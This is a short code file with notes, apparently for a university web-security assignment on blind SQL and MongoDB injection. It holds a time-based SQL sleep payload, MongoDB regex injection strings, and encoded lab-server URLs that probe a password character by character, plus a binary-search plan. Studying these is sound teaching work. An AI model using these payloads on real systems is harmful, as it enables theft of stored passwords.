#CS510 Web Security Andrew Rogers Program 1
#Fall 2017

#regular expressions

#SQL - IF, LIKE, SLEEP
# IF(password LIKE BINARY "p4ssw0rd",sleep(5),null)
# if the password is (case sensitive) p4ssw0rd, sleep for 5 seconds, otherwise do nothing

#Regex to match all password-- this.password.match(/^.*/)

#Add MondoDB comment and inject
#?search=admin' && this.password.match(/^.*/)//

#Only match if first char of password is capital letter or digit
# http://131.252.220.62/mongodb/example2/?search=admin%27%20%26%26%20this.password.match(%2F%5e%5bA-Z0-9%5d.*%2F)%2F%2F

#Only match if first char of password is lowercase letter 
# http://131.252.220.62/mongodb/example2/?search=admin%27%20%26%26%20this.password.match(%2F%5e%5ba-z%5d.*%2F)%2F%2F

testpwd = "t3sT"

full_range = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"

#Binary Search
# 1. Is the character a number or capital?
#	If yes is it a number?
#		if yes then split the number range to find
#		if no then split the capital letter range to find
#	If no then split the lowercase letter range to find
#